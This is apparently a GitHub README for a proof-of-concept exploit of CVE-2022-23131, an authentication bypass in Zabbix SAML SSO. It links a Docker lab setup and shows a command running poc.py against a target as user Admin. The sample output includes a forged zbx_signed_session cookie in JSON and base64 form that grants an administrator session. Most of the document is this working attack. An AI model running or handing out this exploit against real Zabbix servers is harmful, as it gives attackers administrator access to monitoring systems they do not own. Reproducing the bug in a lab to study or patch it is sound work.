# Zabbix SAML SSO Login Bypass Vulnerability CVE-2022-23131

Enviroment and Poc of CVE-2022-23131

## Enviroment

You can create a Zabbix with SAML SSO follow the step in [Zabbix Enviroment for CVE-2022-23131](https://github.com/trganda/dockerenv/tree/master/vuln/zabbix/CVE-2022-23131).

## Poc

Usage:

```bash
python3 poc.py -t http://localhost:8080 -u Admin

# output
2022-02-24 17:08:29.918 | INFO     | __main__:exp:28 - Target was vulnerable.
2022-02-24 17:08:29.918 | INFO     | __main__:exp:31 - zbx_signed_session(json format): {"saml_data": {"username_attribute": "Admin"}, "sessionid": "61f853f881aacf62e9b7b7797e3bd497", "sign": "WcYIpvwgj/5PylfVvq/QjDQhmB9dln7dYWaoYe/lH0iilgbBE8PaCO6GTh4xQuefeJjSYqndedOXKezIfKAcow=="}
2022-02-24 17:08:29.918 | INFO     | __main__:exp:34 - zbx_signed_session: eyJzYW1sX2RhdGEiOiB7InVzZXJuYW1lX2F0dHJpYnV0ZSI6ICJBZG1pbiJ9LCAic2Vzc2lvbmlkIjogIjYxZjg1M2Y4ODFhYWNmNjJlOWI3Yjc3OTdlM2JkNDk3IiwgInNpZ24iOiAiV2NZSXB2d2dqLzVQeWxmVnZxL1FqRFFobUI5ZGxuN2RZV2FvWWUvbEgwaWlsZ2JCRThQYUNPNkdUaDR4UXVlZmVKalNZcW5kZWRPWEtleklmS0Fjb3c9PSJ9
```
